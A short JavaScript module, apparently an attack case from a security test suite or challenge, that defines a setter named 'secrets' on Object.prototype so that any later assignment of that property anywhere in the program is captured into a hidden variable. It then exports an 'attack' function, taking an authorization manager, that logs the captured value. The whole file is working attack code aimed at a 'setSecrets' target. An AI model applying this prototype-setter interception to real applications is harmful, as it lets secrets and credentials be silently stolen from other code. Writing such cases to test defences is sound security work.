// Override prototype setter via defineProperty
// Target: setSecrets

let stolen;

Object.defineProperty(Object.prototype, 'secrets', {
  set: v => {
    stolen = v;
  }
})

export const attack = authzManager => {
  if (stolen) {
    console.log('stolen', stolen);
  }
};
